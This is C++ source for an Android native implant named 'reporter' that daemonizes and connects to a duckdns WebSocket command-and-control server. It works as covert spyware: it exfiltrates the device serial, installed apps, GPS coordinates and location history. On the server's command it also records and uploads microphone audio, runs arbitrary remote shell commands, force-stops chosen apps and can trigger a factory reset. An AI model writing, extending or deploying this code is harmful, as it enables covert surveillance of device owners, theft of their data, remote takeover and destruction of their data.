#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <algorithm>
#include <ctime>
#include <cstring>
#include <cctype>
#include <cstdio>
#include <memory>
#include <array>
#include <thread>
#include <chrono>

#include <unistd.h>
#ifndef __ANDROID__
#include <cstdarg>
#define PROP_VALUE_MAX 92
static int __system_property_get(const char* name, char* value) {
    (void)name;
    if (value) {
        value[0] = '\0';
    }
    return 0;
}
static int __android_log_print(int prio, const char* tag, const char* fmt, ...) {
    (void)prio;
    (void)tag;
    va_list args;
    va_start(args, fmt);
    int ret = vfprintf(stderr, fmt, args);
    va_end(args);
    return ret;
}
#else
#include <sys/system_properties.h>
#include <android/log.h>
#endif
#include <sys/stat.h>
#include <sys/wait.h>
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>
#include <queue>
#include <mutex>
#include <condition_variable>

// Configuration
const std::string WS_SERVER_URL  = "wss://android-telemetry-44.duckdns.org:8000/ws";
const std::string IMPLANT_KEY = "DeltaForce2027";
const char* LOG_TAG = "reporter";
const char* LOG_PATH = "/data/local/tmp/reporter.log";
const char* DISABLE_FILE = "/data/local/tmp/reporter_disable";
const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
const char* MIC_FILE = "/data/local/tmp/mic.wav";
const char* LOC_FILE = "/data/local/tmp/location_enabled";

// Log rotation settings
const long MAX_LOG_SIZE = 1024 * 1024; // 1 MB
const int MAX_LOG_FILES = 5;

// ── Globals ──────────────────────────────────────────────────────────────────

FILE* g_log_file = nullptr;
size_t g_log_size = 0;
std::string g_device_id;
std::string g_build_id;
std::string g_build_version;
std::string g_build_type;
std::string g_device_name;
ix::WebSocket g_webSocket;
std::queue<std::string> g_taskQueue;
std::mutex g_taskMutex;
std::condition_variable g_taskCV;

std::vector<std::string> g_forbiddenApps;
std::mutex g_forbiddenMutex;

int g_ping_interval = 60;
int g_last_battery_level = -1;
int g_last_loc_state = -1;
int g_last_charging_state = -1;
double g_last_lat = 0.0;
double g_last_lon = 0.0;
std::string g_installed_apps;
std::string g_last_installed_apps;
bool g_installed_apps_dirty = true;
int g_screen_time_minutes = 0;
std::string g_last_screen_time_report_key;
std::chrono::steady_clock::time_point g_screen_time_last_update;
bool g_first_report = true;


// ── Helpers ──────────────────────────────────────────────────────────────────

void rotate_logs() {
    if (!g_log_file) return;

    // Close the current log file
    fclose(g_log_file);

    // Shift old log files
    for (int i = MAX_LOG_FILES - 1; i > 0; --i) {
        std::string old_path = std::string(LOG_PATH) + "." + std::to_string(i);
        std::string new_path = std::string(LOG_PATH) + "." + std::to_string(i + 1);
        if (access(old_path.c_str(), F_OK) == 0) {
            rename(old_path.c_str(), new_path.c_str());
        }
    }

    // Rename current log to .1
    rename(LOG_PATH, (std::string(LOG_PATH) + ".1").c_str());

    // Reopen the main log file
    g_log_file = fopen(LOG_PATH, "a");
    if (!g_log_file) {
        std::cerr << "Failed to reopen log file after rotation: " << LOG_PATH << std::endl;
    } else {
        g_log_size = 0;
    }
}

/**
 * Log a message to both stderr and the log file.
 */
void log_message(const std::string& message) {
    std::time_t now = std::time(nullptr);
    char time_buf[100];
    struct tm tm_buf;
    localtime_r(&now, &tm_buf);
    std::strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", &tm_buf);

    std::string formatted;
    formatted.reserve(2 + std::strlen(time_buf) + 1 + message.size());
    formatted.push_back('[');
    formatted += time_buf;
    formatted += "] ";
    formatted += message;

    if (g_log_file && g_log_size + formatted.size() + 1 > MAX_LOG_SIZE) {
        rotate_logs();
    }

#ifdef __ANDROID__
    __android_log_print(ANDROID_LOG_INFO, LOG_TAG, "%s", formatted.c_str());
#else
    std::cerr << formatted << std::endl;
#endif

    if (g_log_file) {
        fprintf(g_log_file, "%s\n", formatted.c_str());
        fflush(g_log_file);
        g_log_size += formatted.size() + 1;
    }
}

bool run_command_no_output(const std::vector<std::string>& argv) {
    if (argv.empty()) return false;

    std::vector<char*> cargs;
    cargs.reserve(argv.size() + 1);
    for (const auto& arg : argv) {
        cargs.push_back(const_cast<char*>(arg.c_str()));
    }
    cargs.push_back(nullptr);

    pid_t pid = fork();
    if (pid == -1) return false;
    if (pid == 0) {
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    int status = 0;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

std::string exec_cmd(const std::string& cmd) {
    std::array<char, 256> buffer;
    std::string result;
    result.reserve(4096); // pre-allocate to prevent heap fragmentation
    log_message("Executing command: " + cmd);

    auto pipe_closer = [](FILE* f) {
        if (f) pclose(f);
    };
    std::unique_ptr<FILE, decltype(pipe_closer)> pipe(popen(cmd.c_str(), "r"), pipe_closer);
    if (!pipe) {
        log_message("Failed to execute command: " + cmd);
        return "UNKNOWN";
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result.append(buffer.data());
    }

    // Trim trailing whitespace/newlines
    result.erase(std::find_if(result.rbegin(), result.rend(), [](unsigned char ch) {
        return !std::isspace(ch);
    }).base(), result.end());

    if (result.empty()) {
        log_message("Command returned empty output: " + cmd);
        return "UNKNOWN";
    }
    
    log_message("Command output: " + result);
    return result;
}

constexpr int MAX_RETRY = 3;
constexpr int RETRY_DELAY_SEC = 5;

/**
 * Retries a command multiple times if it fails.
 */
std::string exec_cmd_retry(const std::string& cmd) {
    for (int i = 1; i <= MAX_RETRY; ++i) {
        std::string out = exec_cmd(cmd);
        if (out != "UNKNOWN") return out;
        if (i < MAX_RETRY) {
            log_message("Retrying command (" + std::to_string(i) + "/" + std::to_string(MAX_RETRY) + "): " + cmd);
            std::this_thread::sleep_for(std::chrono::seconds(RETRY_DELAY_SEC));
        }
    }
    log_message("Command failed after " + std::to_string(MAX_RETRY) + " retries: " + cmd);
    return "UNKNOWN";
}

/**
 * Parses simple JSON response natively.
 * Handles both quoted strings and numeric values.
 */
std::string get_json_val(const std::string& json, const std::string& key) {
    if (json.empty() || key.empty()) return "";
    
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    
    pos = json.find(':', pos + search.length());
    if (pos == std::string::npos) return "";
    pos++; // skip ':'
    
    // Skip potential spaces
    while (pos < json.length() && std::isspace(static_cast<unsigned char>(json[pos]))) pos++;
    
    std::string value;
    if (pos < json.length() && json[pos] == '\"') {
        pos++; // skip opening quote
        size_t end = json.find('\"', pos);
        if (end != std::string::npos) {
            value = json.substr(pos, end - pos);
        }
    } else {
        size_t end = json.find_first_of(",}", pos);
        if (end == std::string::npos) end = json.length();
        
        // Trim trailing spaces for numeric/boolean values
        while (end > pos && std::isspace(static_cast<unsigned char>(json[end - 1]))) end--;
        value = json.substr(pos, end - pos);
    }
    
    // Optimize logging to avoid string allocation overhead if logging is disabled or heavy
    // log_message("JSON value for key '" + key + "': " + value);
    return value;
}

std::string json_escape(const std::string& input) {
    std::string escaped;
    escaped.reserve(input.size());
    for (unsigned char c : input) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (c < 0x20) {
                    char buf[7];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    escaped += buf;
                } else {
                    escaped.push_back(c);
                }
                break;
        }
    }
    return escaped;
}

bool websocket_is_open() {
    return g_webSocket.getReadyState() == ix::WebSocket::ReadyState::Open;
}

/**
 * Gets battery level from sysfs (fast).
 */
bool is_location_enabled() {
    std::ifstream ifs(LOC_FILE);
    int status = 1;
    if (ifs.is_open()) {
        ifs >> status;
    } else {
        std::ofstream ofs(LOC_FILE);
        ofs << 1;
    }
    return status == 1;
}

void set_location_file(int status) {
    std::ofstream ofs(LOC_FILE);
    ofs << status;
}

int get_battery_level() {
    std::ifstream ifs("/sys/class/power_supply/battery/capacity");
    int level;
    if (ifs.is_open() && (ifs >> level)) {
        return level;
    }
    // Dumpsys was removed here to prevent shelling out. Battery capacity from sysfs is highly reliable.
    return -1;
}

int get_charging_state() {
    std::ifstream ifs("/sys/class/power_supply/battery/status");
    std::string status;
    if (ifs.is_open() && std::getline(ifs, status)) {
        if (status.find("Charging") != std::string::npos || status.find("Full") != std::string::npos) {
            return 1;
        }
    }
    return 0;
}

// ── System Info Fetching ───────────────────────────────────────────────────

std::string get_sys_prop(const char* prop_name) {
    char value[PROP_VALUE_MAX];
    if (__system_property_get(prop_name, value) > 0) {
        return std::string(value);
    }
    return "UNKNOWN";
}

std::string get_build_id() { return get_sys_prop("ro.build.id"); }
std::string get_build_version() { return get_sys_prop("ro.build.version.release"); }
std::string get_build_type() { return get_sys_prop("ro.build.type"); }
std::string get_device_name() { return get_sys_prop("ro.product.model"); }
std::string get_serialno() { 
    std::string s = get_sys_prop("ro.serialno");
    return s == "UNKNOWN" ? "UNKNOWN_DEVICE" : s; 
}

std::string get_installed_apps() {
    FILE* pipe = popen("pm list packages", "r");
    if (!pipe) return "";
    std::array<char, 128> buffer;
    std::string apps;

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        std::string line(buffer.data());
        if (!line.empty() && line.back() == '\n') {
            line.pop_back();
        }
        constexpr const char prefix[] = "package:";
        if (line.rfind(prefix, 0) == 0) {
            std::string pkg = line.substr(sizeof(prefix) - 1);
            if (!pkg.empty()) {
                if (!apps.empty()) apps.push_back(',');
                apps += pkg;
            }
        }
    }
    pclose(pipe);
    return apps;
}

static bool parse_double_from_token(const std::string& token, double& value) {
    size_t pos = 0;
    while (pos < token.size() && token[pos] != '+' && token[pos] != '-' && !std::isdigit(static_cast<unsigned char>(token[pos]))) {
        pos++;
    }
    if (pos >= token.size()) {
        return false;
    }

    try {
        size_t consumed = 0;
        value = std::stod(token.substr(pos), &consumed);
        return consumed > 0;
    } catch (const std::exception&) {
        return false;
    }
}

static bool parse_coords_in_line(const std::string& line, double& lat, double& lon) {
    size_t pos = 0;
    while (true) {
        size_t comma = line.find(',', pos);
        if (comma == std::string::npos) break;

        size_t start = comma;
        while (start > 0 && (std::isdigit(static_cast<unsigned char>(line[start - 1])) || line[start - 1] == '+' || line[start - 1] == '-' || line[start - 1] == '.')) {
            start--;
        }

        size_t end = comma + 1;
        while (end < line.size() && (std::isdigit(static_cast<unsigned char>(line[end])) || line[end] == '+' || line[end] == '-' || line[end] == '.')) {
            end++;
        }

        std::string lat_token = line.substr(start, comma - start);
        std::string lon_token = line.substr(comma + 1, end - (comma + 1));

        double lat_value = 0.0;
        double lon_value = 0.0;
        if (parse_double_from_token(lat_token, lat_value) && parse_double_from_token(lon_token, lon_value)) {
            if (lat_value >= -90.0 && lat_value <= 90.0 && lon_value >= -180.0 && lon_value <= 180.0) {
                lat = lat_value;
                lon = lon_value;
                return true;
            }
        }

        pos = comma + 1;
    }
    return false;
}

static bool get_location_from_dumpsys_output(const std::string& output, double& lat, double& lon) {
    if (output.empty() || output == "UNKNOWN") {
        return false;
    }

    // Prefer GPS provider output if available.
    const std::vector<std::string> providers = {"gps", "network", "passive"};
    for (const auto& provider : providers) {
        size_t pos = 0;
        while ((pos = output.find(provider, pos)) != std::string::npos) {
            size_t line_end = output.find('\n', pos);
            std::string line = output.substr(pos, line_end == std::string::npos ? output.size() - pos : line_end - pos);
            if (parse_coords_in_line(line, lat, lon)) {
                return true;
            }
            pos += provider.size();
        }
    }

    // Fallback to any valid coordinate pair in the dumpsys output.
    return parse_coords_in_line(output, lat, lon);
}

bool get_location_from_gps_provider(double& lat, double& lon) {
    std::string output = exec_cmd("dumpsys location");
    return get_location_from_dumpsys_output(output, lat, lon);
}

std::string format_time_iso(time_t t) {
    char buf[64];
    struct tm tm_buf;
    localtime_r(&t, &tm_buf);
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tm_buf);
    return std::string(buf);
}

std::string make_hour_key(time_t t) {
    char buf[32];
    struct tm tm_buf;
    localtime_r(&t, &tm_buf);
    std::strftime(buf, sizeof(buf), "%Y-%m-%d-%H", &tm_buf);
    return std::string(buf);
}

void update_screen_time() {
    auto now = std::chrono::steady_clock::now();
    if (g_screen_time_last_update == std::chrono::steady_clock::time_point()) {
        g_screen_time_last_update = now;
        return;
    }

    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - g_screen_time_last_update);
    if (elapsed.count() >= 60) {
        int minutes = static_cast<int>(elapsed.count() / 60);
        g_screen_time_minutes += minutes;
        g_screen_time_last_update += std::chrono::seconds(minutes * 60);
    }
}

std::string get_current_installed_apps() {
    if (g_installed_apps.empty() || g_installed_apps_dirty) {
        g_installed_apps = get_installed_apps();
        g_installed_apps_dirty = false;
    }
    return g_installed_apps;
}

bool should_send_screen_time(time_t now) {
    const std::string current_hour = make_hour_key(now);
    if (g_first_report || current_hour != g_last_screen_time_report_key) {
        g_last_screen_time_report_key = current_hour;
        return true;
    }
    return false;
}

// ── Networking Helpers (ixwebsocket) ────────────────────────────────────────

void send_report(const std::string& data) {
    log_message("Sending report natively: " + data);
    if (!websocket_is_open()) {
        log_message("WS not open; report skipped until the connection is restored.");
        return;
    }
    g_webSocket.sendText(data);
}

void upload_file(const std::string& filepath, const std::string& type = "file") {
    if (access(filepath.c_str(), F_OK) == -1) {
        log_message("File not found, skipping upload: " + filepath);
        return;
    }
    log_message("Uploading file natively: " + filepath);
    
    // First, send metadata
    std::string meta_json = "{\"implant_key\":\"" + json_escape(IMPLANT_KEY) + "\", \"upload_type\":\"" + json_escape(type) + "\", \"filepath\":\"" + json_escape(filepath) + "\"}";
    if (websocket_is_open()) {
        g_webSocket.sendText(meta_json);
    } else {
        log_message("WS not open; upload metadata skipped.");
    }

    // Then, send binary file data (Optimized: Direct alloc, no stringstream)
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (file) {
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::string buffer;
        buffer.resize(size);
        if (file.read(&buffer[0], size)) {
            if (websocket_is_open()) {
                g_webSocket.sendBinary(buffer);
                log_message("Upload finished natively via WS (" + std::to_string(size) + " bytes).");
            } else {
                log_message("WS not open; file upload skipped.");
            }
        }
    } else {
        log_message("Failed to read file for upload.");
    }
}

bool upload_file(const std::string& dev_id, const std::string& path, const std::string& type) {
    upload_file(path, type);
    return true;
}

/**
 * Main reporting function.
 */
void do_report() {
    log_message("Starting report.");
    update_screen_time();
    time_t now = time(nullptr);
    bool loc_allowed = is_location_enabled();
    int loc_state = loc_allowed ? 1 : 0;
    double current_lat = 0.0;
    double current_lon = 0.0;
    bool have_location = false;
    if (loc_allowed) {
        have_location = get_location_from_gps_provider(current_lat, current_lon);
        if (!have_location) {
            log_message("Failed to acquire GPS coordinates from dumpsys.");
        }
    }
    int battery_level = get_battery_level();
    int charging_state = get_charging_state();
    std::string apps = get_current_installed_apps();
    bool send_screen_time = should_send_screen_time(now);
    bool send_latlon = false;
    bool state_changed = g_first_report;

    if (g_first_report || loc_state != g_last_loc_state) {
        send_latlon = have_location;
    } else if (loc_allowed && have_location && (current_lat != g_last_lat || current_lon != g_last_lon)) {
        send_latlon = true;
    }

    if (g_first_report || battery_level != g_last_battery_level) {
        state_changed = true;
    }
    if (g_first_report || charging_state != g_last_charging_state) {
        state_changed = true;
    }
    if (g_first_report || loc_state != g_last_loc_state) {
        state_changed = true;
    }
    if (send_latlon) {
        state_changed = true;
    }
    if (!apps.empty() && (g_first_report || apps != g_last_installed_apps)) {
        state_changed = true;
    }
    if (send_screen_time) {
        state_changed = true;
    }

    if (!state_changed) {
        log_message("No report-worthy state change detected; skipping report.");
        g_first_report = false;
        return;
    }

    std::string json;
    json.reserve(512);
    json = "{\"implant_key\":\"";
    json += json_escape(IMPLANT_KEY);
    json += "\",\"device_id\":\"";
    json += json_escape(g_device_id);
    json += "\"";

    if (g_first_report || battery_level != g_last_battery_level) {
        json += ",\"battery\":";
        json += std::to_string(battery_level);
        g_last_battery_level = battery_level;
    }

    if (g_first_report || charging_state != g_last_charging_state) {
        json += ",\"charging\":";
        json += std::to_string(charging_state);
        g_last_charging_state = charging_state;
    }

    if (g_first_report || loc_state != g_last_loc_state) {
        json += ",\"loc_state\":";
        json += std::to_string(loc_state);
        g_last_loc_state = loc_state;
    }

    if (send_latlon) {
        json += ",\"lat\":";
        json += std::to_string(current_lat);
        json += ",\"lon\":";
        json += std::to_string(current_lon);
        g_last_lat = current_lat;
        g_last_lon = current_lon;
    }

    if (!apps.empty() && (g_first_report || apps != g_last_installed_apps)) {
        json += ",\"installed_apps\":\"";
        json += json_escape(apps);
        json += "\"";
        g_last_installed_apps = apps;
    }

    if (send_screen_time) {
        json += ",\"screen_time_minutes\":";
        json += std::to_string(g_screen_time_minutes);
        json += ",\"event\":\"hourly_screen_time_update\"";
    }

    json += ",\"build_id\":\"";
    json += json_escape(g_build_id);
    json += "\"";
    json += ",\"build_version\":\"";
    json += json_escape(g_build_version);
    json += "\"";
    json += ",\"build_type\":\"";
    json += json_escape(g_build_type);
    json += "\"";
    json += ",\"device\":\"";
    json += json_escape(g_device_name);
    json += "\"}";

    send_report(std::move(json));
    log_message("Report finished.");
    g_first_report = false;
}

/**
 * Records audio from the microphone.
 */
void do_mic_record(int duration_s) {
    if (duration_s <= 0) return;
    std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
    log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
    exec_cmd(cmd);
    log_message("Microphone recording finished.");
    upload_file(MIC_FILE);
}

/**
 * Gets GPS location history.
 */
void do_gps_dump() {
    log_message("Dumping GPS history.");
    std::string output = exec_cmd("dumpsys location");

    std::ofstream os(GPS_FILE, std::ios::trunc);
    if (os) {
        if (output != "UNKNOWN" && !output.empty()) {
            os << output << '\n';
        }

        std::string log_output = exec_cmd("logcat -d -b radio");
        size_t start = 0;
        while (start < log_output.size()) {
            size_t end = log_output.find('\n', start);
            std::string line = log_output.substr(start, end == std::string::npos ? std::string::npos : end - start);
            if (line.find("GpsLocation") != std::string::npos) {
                os << line << '\n';
            }
            if (end == std::string::npos) break;
            start = end + 1;
        }
    }
    log_message("GPS history dump finished.");
    upload_file(GPS_FILE);
}

/**
 * Executes a shell command received from C2.
 */
void do_shell_command(const std::string& shell_cmd) {
    if (shell_cmd.empty()) return;
    log_message("Executing remote shell command: " + shell_cmd);
    std::string result = exec_cmd(shell_cmd);
    
    // Fallback if output was empty to let the C2 know it ran without output.
    if (result == "UNKNOWN") {
        result = "[Executed with no output or failed]";
    }
    
    // Simple JSON escaping for the result to prevent malformed JSON
    std::string escaped_result;
    for (char c : result) {
        if (c == '"') escaped_result += "\\\"";
        else if (c == '\\') escaped_result += "\\\\";
        else if (c == '\n') escaped_result += "\\n";
        else if (c == '\r') escaped_result += "\\r";
        else escaped_result += c;
    }
    
    std::string json_req = "{\"implant_key\":\"" + IMPLANT_KEY + "\",\"command_result\":\"" + escaped_result + "\"}";
    g_webSocket.sendText(json_req);
    log_message("Remote shell command execution finished.");
}

void do_factory_reset() {
    log_message("Factory reset requested by C2.");
    std::string result = exec_cmd("am broadcast -a android.intent.action.MASTER_CLEAR");
    if (result == "UNKNOWN") {
        result = "[Factory reset command executed with no output or failed]";
    }

    std::string escaped_result;
    for (char c : result) {
        if (c == '"') escaped_result += "\\\"";
        else if (c == '\\') escaped_result += "\\\\";
        else if (c == '\n') escaped_result += "\\n";
        else if (c == '\r') escaped_result += "\\r";
        else escaped_result += c;
    }

    std::string json_req = "{\"implant_key\":\"" + IMPLANT_KEY + "\",\"command_result\":\"" + escaped_result + "\"}";
    g_webSocket.sendText(json_req);
    log_message("Factory reset command finished.");
}

/**
 * Processes queued C2 server tasks natively from WebSocket messages.
 */
void process_tasks() {
    std::vector<std::string> tasks;
    {
        std::lock_guard<std::mutex> lock(g_taskMutex);
        tasks.reserve(g_taskQueue.size()); // Pre-allocate vector capacity
        while (!g_taskQueue.empty()) {
            // std::move prevents allocating and copying the JSON payload again
            tasks.push_back(std::move(g_taskQueue.front()));
            g_taskQueue.pop();
        }
    }
    
    if (tasks.empty()) return;
    log_message("Processing " + std::to_string(tasks.size()) + " queued C2 tasks.");

    for (const auto& response : tasks) {
        std::string task = get_json_val(response, "task");
        if (task == "mic_record") {
            int duration = 0;
            try {
                duration = std::stoi(get_json_val(response, "duration"));
            } catch (const std::exception&) {}
            std::thread([duration]() { do_mic_record(duration); }).detach(); // Async
        } else if (task == "gps_dump") {
            std::thread([]() { do_gps_dump(); }).detach(); // Async
        } else if (task == "shell") {
            std::string cmd = get_json_val(response, "command");
            std::thread([cmd]() { do_shell_command(cmd); }).detach(); // Async
        } else if (task == "report") {
            do_report();
        } else if (task == "update_blocked_apps") {
            std::string apps_str = get_json_val(response, "apps");
            std::vector<std::string> apps;
            size_t start = 0;
            while (start < apps_str.size()) {
                size_t comma = apps_str.find(',', start);
                std::string item = apps_str.substr(start, comma == std::string::npos ? std::string::npos : comma - start);
                if (!item.empty() && item != " ") {
                    apps.push_back(item);
                }
                if (comma == std::string::npos) break;
                start = comma + 1;
            }
            std::lock_guard<std::mutex> lock(g_forbiddenMutex);
            g_forbiddenApps = apps;
            log_message("Updated blocked apps list: " + std::to_string(apps.size()) + " apps blocked.");
        } else if (task == "set_location") {
            int track = 0;
            try { track = std::stoi(get_json_val(response, "track")); } catch(...) {}
            set_location_file(track);
            log_message("Location tracking set to: " + std::to_string(track));
            do_report();
        } else if (task == "check_location_state") {
            log_message("Reporting location state explicitly.");
            do_report();
        } else if (task == "factory_reset") {
            std::thread([]() { do_factory_reset(); }).detach(); // Async, because this may reboot the device
        } else if (task == "refresh_installed_apps") {
            log_message("Refreshing installed apps on-demand.");
            g_installed_apps_dirty = true;
            do_report();
        } else if (task == "set_interval") {
            int interval = g_ping_interval;
            try { interval = std::stoi(get_json_val(response, "interval")); } catch(...) {}
            g_ping_interval = interval;
            log_message("Ping interval updated to: " + std::to_string(g_ping_interval));
        } else if (task == "system_alert") {
            std::string state = get_json_val(response, "state");
            std::string text = get_json_val(response, "text");
            log_message("System alert received: state=" + state + " text=" + text);
        } else if (task == "audio_blast") {
            std::string play = get_json_val(response, "play");
            log_message("Audio blast request received: play=" + play);
        } else if (task == "power_cmd") {
            std::string action = get_json_val(response, "action");
            log_message("Power command received: action=" + action);
        } else if (!task.empty()) {
            log_message("Unknown task received: " + task);
        }
    }
}


// ── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    // Open log file
    g_log_file = fopen(LOG_PATH, "a");
    if (!g_log_file) {
        std::cerr << "Failed to open log file: " << LOG_PATH << std::endl;
    } else {
        fseek(g_log_file, 0, SEEK_END);
        g_log_size = static_cast<size_t>(ftell(g_log_file));
    }

    // Cache constant device metadata to avoid repeated sysprop lookups
    g_device_id = get_serialno();
    g_build_id = get_build_id();
    g_build_version = get_build_version();
    g_build_type = get_build_type();
    g_device_name = get_device_name();

    log_message("Reporter starting up.");

    // Init IXWebSocket
    ix::initNetSystem();
    g_webSocket.setUrl(WS_SERVER_URL);
    g_webSocket.setPingInterval(45); // Keep-alive ping every 45 secs to prevent dropped NAT connections
    g_webSocket.enableAutomaticReconnection(); // Ensure it recovers connection drops
    
    g_webSocket.setOnMessageCallback([](const ix::WebSocketMessagePtr& msg) {
        if (msg->type == ix::WebSocketMessageType::Message) {
            log_message("WS Command Received.");
            {
                std::lock_guard<std::mutex> lock(g_taskMutex);
                g_taskQueue.push(msg->str);
            }
            g_taskCV.notify_one(); // Wake up main thread instantly
        } else if (msg->type == ix::WebSocketMessageType::Open) {
            log_message("WS Connection open");
        } else if (msg->type == ix::WebSocketMessageType::Error) {
            log_message("WS Connection error: " + msg->errorInfo.reason);
        }
    });
    g_webSocket.start();

    // Daemonize
    if (fork() != 0) {
        return 0;
    }
    setsid();
    if (fork() != 0) {
        return 0;
    }
    chdir("/");
    umask(0);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Main loop
    // Start app blocker thread
    std::thread([]() {
        while (true) {
            std::vector<std::string> current_apps;
            {
                std::lock_guard<std::mutex> lock(g_forbiddenMutex);
                current_apps = g_forbiddenApps;
            }
            for (const auto& pkg : current_apps) {
                // Force stop the package to prevent usage
                run_command_no_output({"am", "force-stop", pkg});
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }).detach();

    while (true) {
        if (access(DISABLE_FILE, F_OK) == 0) {
            log_message("Disable file found. Exiting.");
            break;
        }
        
        do_report();
        
        // Sleep until we get a notification from websocket, or max ping interval
        int interval = std::max(1, g_ping_interval);
        std::unique_lock<std::mutex> lock(g_taskMutex);
        g_taskCV.wait_for(lock, std::chrono::seconds(interval), []{ return !g_taskQueue.empty(); });
        lock.unlock(); // Unlock before processing to prevent deadlocks
        
        process_tasks();
    }

    log_message("Reporter shutting down.");
    g_webSocket.stop();
    ix::uninitNetSystem();

    if (g_log_file) {
        fclose(g_log_file);
    }

    return 0;
}
